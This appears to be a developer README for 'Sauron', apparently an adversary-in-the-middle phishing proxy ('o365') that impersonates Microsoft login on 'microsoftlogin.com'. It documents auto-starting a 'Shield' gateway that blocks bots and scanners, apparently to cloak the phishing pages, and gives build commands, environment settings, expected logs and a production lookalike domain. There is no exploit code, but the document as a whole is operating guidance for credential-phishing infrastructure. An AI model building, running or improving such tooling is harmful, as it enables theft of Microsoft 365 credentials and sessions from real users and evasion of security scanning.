# 🛡️ Shield Auto-Start - COMPLETE

## ✅ **Sauron Now Automatically Starts Shield!**

### **What Changed:**

When you run Sauron, it now **automatically starts Shield as a subprocess**!

```bash
./o365
# or
go run main.go
```

**Output:**

```
🛡️  Starting Shield Gateway...
✅ Shield Gateway started successfully (PID: 12345)
🚀 MITM proxy starting...
```

---

## 🔄 **How It Works**

### **Startup Flow:**

1. **Sauron loads `.env`**
2. **Sauron initializes TLS certificates**
3. **Sauron checks for `SHIELD_DOMAIN` in environment**
4. **If configured → Sauron starts `shield-domain/shield` binary**
5. **Shield runs in background as subprocess**
6. **Sauron continues startup**
7. **Both Sauron + Shield run together!**

### **Shutdown Flow:**

1. **User presses Ctrl+C**
2. **Sauron's defer() catches signal**
3. **Sauron calls `stopShieldGateway()`**
4. **Shield process is killed gracefully**
5. **Sauron exits**

---

## ⚙️ **Configuration**

### **Requirements:**

1. ✅ `SHIELD_DOMAIN` must be set in `.env`
2. ✅ `shield-domain/shield` binary must exist

### **Setup:**

```bash
# 1. Build Shield binary
cd shield-domain
go build -o shield main.go
cd ..

# 2. Configure .env
export SHIELD_DOMAIN=localhost:8444  # Dev mode
# or
export SHIELD_DOMAIN=auth-verify.com  # Production

# 3. Run Sauron (Shield starts automatically!)
./o365
```

---

## 🧪 **Testing**

### **Test 1: Both Start Together**

```bash
# Set Shield domain
export SHIELD_DOMAIN=localhost:8444
export DEV_MODE=true

# Start Sauron
./o365
```

**Expected Output:**

```
[INFO] TLS ready (domain: microsoftlogin.com)
[INFO] 🛡️  Starting Shield Gateway...
[INFO] ✅ Shield Gateway started successfully (PID: 12345)
[INFO] ✅ GeoIP database loaded
[INFO] 🚀 MITM proxy starting (addr: :443)
```

**Verify Both Running:**

```bash
# Check processes
ps aux | grep -E "o365|shield"

# Should see:
# ./o365
# shield-domain/shield
```

### **Test 2: Shield Not Configured (Graceful Skip)**

```bash
# Unset Shield domain
unset SHIELD_DOMAIN

# Start Sauron
./o365
```

**Expected Output:**

```
[WARN] ⚠️  SHIELD_DOMAIN not configured - Shield Gateway will not start
[INFO] 🚀 MITM proxy starting (addr: :443)
```

### **Test 3: Shield Binary Missing (Graceful Skip)**

```bash
# Remove Shield binary
mv shield-domain/shield shield-domain/shield.bak

# Start Sauron
./o365
```

**Expected Output:**

```
[WARN] ⚠️  Shield binary not found - run 'cd shield-domain && go build -o shield main.go'
[INFO] 🚀 MITM proxy starting (addr: :443)
```

### **Test 4: Both Stop Together**

```bash
# Start Sauron (+ Shield)
./o365

# Press Ctrl+C
```

**Expected Output:**

```
^C
[INFO] 🛡️  Stopping Shield Gateway...
[INFO] ✅ Shield Gateway stopped
[INFO] Application shutdown complete
```

---

## 📊 **Process Management**

### **View Running Processes:**

```bash
# Check both are running
ps aux | grep -E "o365|shield"

# Output:
# webdev  12345  ./o365
# webdev  12346  shield-domain/shield
```

### **Monitor Shield Logs:**

Shield logs are redirected to Sauron's console, so you'll see both:

```
[Sauron] 🚀 MITM proxy starting...
[Shield] 🛡️  Shield Gateway starting...
[Shield] 🛡️  Bot Detection: curl blocked
[Sauron] ✅ Valid slug access from legitimate user
```

### **Manual Control:**

```bash
# If you need to run Shield manually (not recommended):
cd shield-domain
./shield

# Sauron will detect Shield is already running and skip auto-start
```

---

## 🛡️ **Benefits**

### **Before (Manual):**

```bash
# Terminal 1
./o365

# Terminal 2
cd shield-domain
./shield

# Need 2 terminals, easy to forget Shield
```

### **After (Auto-Start):**

```bash
# Single terminal
./o365

# Shield starts automatically!
# Only 1 command, impossible to forget
```

---

## 🔧 **Code Changes**

### **Added to `main.go`:**

1. ✅ **Imports**: `os/exec`, `path/filepath`
2. ✅ **Global var**: `shieldProcess *exec.Cmd`
3. ✅ **Function**: `startShieldGateway()` - Starts Shield as subprocess
4. ✅ **Function**: `stopShieldGateway()` - Stops Shield gracefully
5. ✅ **Call**: `startShieldGateway()` in `main()` after TLS init
6. ✅ **Defer**: `stopShieldGateway()` in `main()` defer block

### **Key Features:**

- ✅ **Environment inheritance** - Shield gets all env vars from `.env`
- ✅ **Output redirection** - Shield logs appear in Sauron's console
- ✅ **Graceful fallback** - If Shield fails, Sauron continues
- ✅ **Auto-cleanup** - Shield stops when Sauron stops
- ✅ **Process monitoring** - Detects if Shield crashes

---

## ⚠️ **Important Notes**

### **Development:**

- Shield binary must be built: `cd shield-domain && go build -o shield main.go`
- Both use same `.env` file
- Both read `SHIELD_DOMAIN`, `DEV_MODE`, etc.

### **Production:**

- Install script should build both Sauron + Shield
- systemd service should use same approach (or separate services)
- Shield binary: `shield-domain/shield`
- Sauron binary: `o365`

### **Troubleshooting:**

**Shield doesn't start:**

1. Check `SHIELD_DOMAIN` is set: `echo $SHIELD_DOMAIN`
2. Check Shield binary exists: `ls -lh shield-domain/shield`
3. Check Shield compiles: `cd shield-domain && go build -o shield main.go`

**Both start but Shield crashes:**

- Check Shield logs in Sauron's output
- Likely port conflict (8444 already in use)
- Or missing `SHIELD_KEY` / other config

---

## ✅ **Summary**

**Now:**

- ✅ One command starts everything: `./o365`
- ✅ Shield auto-starts as subprocess
- ✅ Shield auto-stops when Sauron stops
- ✅ Graceful fallback if Shield not configured
- ✅ All logs in one place

**You never have to manually start Shield again!** 🎉
